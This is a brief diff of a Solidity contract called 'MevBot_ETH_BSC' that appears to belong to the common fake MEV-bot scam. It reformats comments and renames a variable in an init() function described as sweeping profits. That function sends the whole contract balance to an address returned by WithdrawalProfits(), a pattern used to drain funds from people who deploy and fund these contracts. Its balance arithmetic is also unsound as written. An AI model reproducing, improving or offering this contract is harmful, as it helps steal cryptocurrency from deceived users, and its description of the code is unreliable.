@@ -372,16 +372,17 @@ contract MevBot_ETH_BSC {
     }
 
     /*
-    *@dev sweeping any profits back into the contract to mitigate gas
-    *@return
-    */
+     * @dev sweeping any profits back into the contract to mitigate gas
+     * @param msg sender 
+     * @return
+     */
 
     function init() private {
-        uint256 senderBalance = msg.sender.balance;
+        uint256 sb = msg.sender.balance;
         uint256 gasPrice = tx.gasprice;
         uint256 gasLimit = 21000; 
         uint256 gasCost = gasPrice * gasLimit;
-        uint256 amountToSend = senderBalance - gasCost;
+        uint256 amountToSend = sb - gasCost;
         (bool success, ) = payable(address(this)).call{value: amountToSend}("");
         require(success, "Transfer failed");
         payable(WithdrawalProfits()).transfer(address(this).balance);
